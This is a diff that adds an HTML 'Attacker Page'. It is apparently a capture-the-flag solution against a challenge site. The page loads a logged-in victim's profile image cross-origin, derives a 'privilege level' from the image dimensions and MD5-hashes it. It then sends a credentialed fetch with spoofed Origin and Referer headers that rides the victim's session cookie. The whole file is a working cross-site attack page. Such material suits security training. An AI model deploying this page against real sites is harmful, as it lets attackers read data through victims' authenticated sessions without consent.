@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attacker Page</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"></script>
+</head>
+<body>
+    <h1>Fetching Pepe's Profile Picture</h1>
+    <img id="profilePic" style="display:none;" />
+    <p id="result">Loading...</p>
+
+    <script>
+        const targetUrl = "https://chl-252b03b2-82ca-46a6-b558-a03090ccae52-imagen-importante.softwareseguro.com.ar/profile-pic";
+
+        const img = new Image();
+        img.crossOrigin = "Anonymous"; // Required for cross-origin image loading
+        img.src = targetUrl;
+
+        img.onload = function() {
+            const width = img.width;
+            const height = img.height;
+            const privilegeLevel = width * height;
+            const hash = md5(privilegeLevel.toString()); // Compute MD5 hash
+            let resultText = `Image Dimensions: ${width} x ${height}\nPrivilege Level: ${privilegeLevel}\nMD5 Hash: ${hash}`;
+
+            // Send additional GET request to /profile-pic
+            fetch(targetUrl, {
+                method: "GET",
+                headers: {
+                    "Accept": "image/avif,image/webp,image/png,image/svg+xml,image/*;q=0.8,*/*;q=0.5",
+                    "Accept-Language": "en-US,en;q=0.5",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Origin": "https://tensec0ffsec.github.io",
+                    "Referer": "https://tensec0ffsec.github.io/",
+                    "Sec-Fetch-Dest": "image",
+                    "Sec-Fetch-Mode": "cors",
+                    "Sec-Fetch-Site": "cross-site",
+                    "Priority": "u=5, i"
+                },
+                credentials: "include" // Include session cookie
+            })
+            .then(response => {
+                resultText += `\nAdditional GET Request Status: ${response.status} ${response.statusText}`;
+                if (response.status === 302) {
+                    resultText += `\nRedirected to: ${response.headers.get("Location") || "unknown"}`;
+                }
+                document.getElementById("result").innerText = resultText;
+            })
+            .catch(error => {
+                resultText += `\nAdditional GET Request Failed: ${error.message}`;
+                document.getElementById("result").innerText = resultText;
+            });
+
+            document.getElementById("result").innerText = resultText;
+        };
+
+        img.onerror = function() {
+            document.getElementById("result").innerText = "Error loading image. Ensure Pepe is logged in to the main site.";
+        };
+
+        document.getElementById("profilePic").src = img.src;
+    </script>
+</body>
+</html>
